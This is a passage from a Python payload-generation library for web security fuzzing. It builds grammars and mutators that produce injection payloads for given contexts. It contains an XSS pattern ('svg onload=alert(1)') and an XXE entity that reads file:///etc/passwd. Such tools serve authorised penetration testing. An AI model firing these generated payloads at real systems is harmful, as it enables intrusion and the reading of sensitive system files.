    g.rule("<svg_tag>", [["<svg>", "<event>", "=alert(1)", "</svg>"]])
    g.rule("<svg>", [["svg"], ["SVG"]])
    g.rule("<event>", [["onload"], ["onerror"], ["onmouseover"]])
    return g


def _build_json_grammar() -> Grammar:
    g = Grammar()
    g.rule("<root>", [["<object>"]])
    g.rule("<object>", [["{", "<pairs>", "}"]])
    g.rule("<pairs>", [[], ["<pair>"], ["<pair>,", "<pairs>"]])
    g.rule("<pair>", [['"a":', "<value>"]])
    g.rule("<value>", [["1"], ['"x"'], ["true"], ["null"], ["<object>"], ["<array>"]])
    g.rule("<array>", [["[", "<items>", "]"]])
    g.rule("<items>", [[], ["<value>"], ["<value>,", "<items>"]])
    return g


def _build_xml_grammar() -> Grammar:
    g = Grammar()
    g.rule("<root>", [["<elem>"]])
    g.rule("<elem>", [["<tag>"], ["<doctype>", "<tag>"]])
    g.rule(
        "<doctype>",
        [
            [
                r"\@<!DOCTYPE",
                "foo",
                r"\@[",
                r"\@<!ENTITY",
                "xxe",
                "SYSTEM",
                r'\@"',
                "file:///etc/passwd",
                r'\@"',
                r"\@]",
                r"\@>",
            ]
        ],
    )
    g.rule("<tag>", [["<open_tag>", "<text>", "<close_tag>"]])
    # Emit literal "<foo>" using the \@ escape prefix
    g.rule("<open_tag>", [[r"\@<foo>"]])
    g.rule("<close_tag>", [[r"\@</foo>"]])
    g.rule("<text>", [["hello"], ["world"], ["&xxe;"]])
    return g


class GrammarFuzzer:
    """Generate payloads from grammars, with seed for reproducibility.

    Example:
        gf = GrammarFuzzer(seed=42)
        for p in gf.generate("sqli", n=10):
            print(p)
    """

    GRAMMARS: Dict[str, Grammar] = {
        "sqli": _build_sql_grammar(),
        "xss": _build_xss_grammar(),
        "json": _build_json_grammar(),
        "xml": _build_xml_grammar(),
    }

    def __init__(self, seed: Optional[int] = None):
        self._rnd = random.Random(seed)

    def available(self) -> List[str]:
        return sorted(self.GRAMMARS.keys())

    def generate(self, kind: str, n: int = 10, max_depth: int = 6) -> List[str]:
        if kind not in self.GRAMMARS:
            raise ValueError(f"unknown grammar kind: {kind}")
        grammar = self.GRAMMARS[kind]
        out: List[str] = []
        for _ in range(max(1, n)):
            out.append(grammar.expand("<root>", max_depth=max_depth, rnd=self._rnd))
        return out


# ---------------------------------------------------------------------------
# New: ContextualMutator — pick payloads that match an injection context
# ---------------------------------------------------------------------------


@dataclass
class InjectionContext:
    """Description of where a payload will be injected.

    Attributes:
        category: vuln class (e.g. "xss", "sqli", "ssrf").
        sinks: list of context tags (e.g. "html", "string", "url").
        quote_style: if applicable ("double-quote", "single-quote", "no-quote", "none").
        transport: if applicable ("http", "xml", "json", "form").
        extra_filters: extra sink tags to include.
    """

    category: str
    sinks: List[str] = field(default_factory=list)
    quote_style: str = "none"
    transport: str = "http"
    extra_filters: List[str] = field(default_factory=list)

    def all_sinks(self) -> List[str]:
        out = list(self.sinks)
        if self.quote_style != "none":
            out.append(self.quote_style)
        out.extend(self.extra_filters)
        if self.transport != "http":
            out.append(self.transport)
        return out


class ContextualMutator:
    """Pick payloads from PayloadDatabase that match a context."""

    def __init__(self, db: Optional[PayloadDatabase] = None):
        self.db = db or PayloadDatabase()

    def candidates(self, context: InjectionContext) -> List[PayloadEntry]:
        return self.db.by_sinks(context.all_sinks(), category=context.category)

    def pick(self, context: InjectionContext, n: int = 10) -> List[str]:
        cands = self.candidates(context)
        if not cands:
            cands = self.db.by_category(context.category)
        if not cands:
            return []
        return [c[2] for c in cands[:n]]

    def mutate_top(
        self,
        context: InjectionContext,
        n: int = 10,
        seed: Optional[int] = None,
    ) -> List[MutationResult]:
        """Pick top candidates and apply generic mutations on top."""
        rnd = random.Random(seed)
        base_payloads = self.pick(context, n=n)
        mutator = PayloadMutator(seed=seed)
        out: List[MutationResult] = []
        for p in base_payloads:
            # Take only first variant to keep result list bounded
            variants = mutator.mutate(p, max_variants=3)
            if variants:
                out.append(
                    MutationResult(payload=variants[0].payload, techniques=variants[0].techniques)
                )
        rnd.shuffle(out)
        return out[:n]


# ---------------------------------------------------------------------------
# New: SmartPayloadGenerator — context + grammar + database
# ---------------------------------------------------------------------------


class SmartPayloadGenerator:
    """Top-level generator that combines database + grammar + mutator.

    Example:
        gen = SmartPayloadGenerator()
        ctx = InjectionContext(category="sqli", sinks=["string"], quote_style="single-quote")
        payloads = gen.generate(ctx, n=15, grammar_n=5)
    """

    def __init__(self, db: Optional[PayloadDatabase] = None, seed: Optional[int] = None):
        self.db = db or PayloadDatabase()
        self.grammar_fuzzer = GrammarFuzzer(seed=seed)
        self.contextual = ContextualMutator(self.db)

    def generate(
        self,
        context: InjectionContext,
        n: int = 20,
        grammar_n: int = 5,
    ) -> List[str]:
        """Combine DB candidates + grammar expansions, dedup, cap at n."""
        out: List[str] = []
        # 1) database candidates
        out.extend(self.contextual.pick(context, n=n))
        # 2) grammar expansions
        if context.category in self.grammar_fuzzer.available():
            try:
                out.extend(self.grammar_fuzzer.generate(context.category, n=grammar_n))
            except ValueError:
                pass
        # 3) contextual mutations on top picks
        mutated = self.contextual.mutate_top(context, n=max(2, n // 4))
        out.extend(m.payload for m in mutated)
        # 4) dedup, cap
        seen: set = set()
        uniq: List[str] = []
        for p in out:
            if p and p not in seen:
                seen.add(p)
                uniq.append(p)
            if len(uniq) >= n:
                break
        return uniq


# ---------------------------------------------------------------------------
# Convenience facade
# ---------------------------------------------------------------------------


def generate_payloads_for_context(
    category: str,
    sinks: Optional[List[str]] = None,
    quote_style: str = "none",
    n: int = 20,
    seed: Optional[int] = None,
) -> List[str]:
    """One-shot helper: build a context and return generated payloads.

    Args:
        category: vuln class (e.g. "xss", "sqli", "ssrf").
        sinks: list of sink tags (e.g. ["html"], ["string"]).
        quote_style: "double-quote", "single-quote", "no-quote", or "none".
        n: max number of payloads to return.
        seed: optional RNG seed for reproducibility.

    Returns:
        List of unique payload strings, capped at ``n``.
    """
    ctx = InjectionContext(
        category=category,
        sinks=list(sinks or []),
        quote_style=quote_style,
    )
    gen = SmartPayloadGenerator(seed=seed)
    return gen.generate(ctx, n=n)
